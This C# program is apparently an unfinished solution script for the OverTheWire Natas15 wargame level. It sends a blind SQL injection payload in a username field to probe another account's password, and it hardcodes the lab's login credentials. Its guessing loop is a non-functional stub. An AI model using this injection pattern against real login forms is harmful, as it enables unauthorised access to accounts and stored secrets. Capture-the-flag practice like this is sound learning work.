using System;
using System.IO;
using System.Net;
using System.Text;

namespace Natas15.Console
{
    class Program
    {
        static void Main( string[] args )
        {
            bool passwordCracked = false;
            string currentGuess = string.Empty;

            while ( passwordCracked == false )
            {
                passwordCracked = true;
            }



            byte[] data = Encoding.ASCII.GetBytes( $"username=natas16\" AND BINARY password LIKE \"{currentGuess}" );

            using ( var webClient = new WebClient() )
            {
                webClient.Headers.Add( "Content-Type", "application/x-www-form-urlencoded" );
                webClient.Credentials = new NetworkCredential( "natas15", "AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J" );

                byte[] response = webClient.UploadData( "http://natas15.natas.labs.overthewire.org/index.php?debug=true", data );

                System.Console.WriteLine( Encoding.ASCII.GetString( response ) );
            }
        }
    }
}
